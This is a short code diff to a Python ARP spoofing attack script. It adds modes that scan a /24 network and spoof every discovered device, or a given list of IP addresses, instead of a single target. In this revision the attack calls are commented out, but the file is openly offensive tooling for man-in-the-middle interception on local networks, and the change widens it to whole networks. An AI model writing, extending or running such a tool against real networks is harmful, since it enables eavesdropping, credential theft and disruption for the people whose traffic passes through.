@@ -93,7 +93,24 @@ if option.mode == 'd':
 else:
     print("[+] Starting ARP Spoofing Attack in Monitor Mode")
 
-start_attack(option.target_ip, option.gateway_ip)
+if option.all:
+    print("[+] Spoofing all devices in the network")
+    print("[+] Scanning network for devices")
+    answered = scan_network(option.gateway_ip + "/24", option.timeout)
+    print("[+] Found " + str(len(answered)) + " devices")
+    for i in answered:
+        print("[+] Spoofing " + i[1].psrc)
+        # start_attack(i[1].psrc, option.gateway_ip)
+
+elif option.list_ip:
+    print("[+] Spoofing devices " + str(option.list_ip))
+    for i in option.list_ip:
+        pass
+        # start_attack(i, option.gateway_ip)
+
+else:
+    pass
+    # start_attack(option.target_ip, option.gateway_ip)
 
 
 
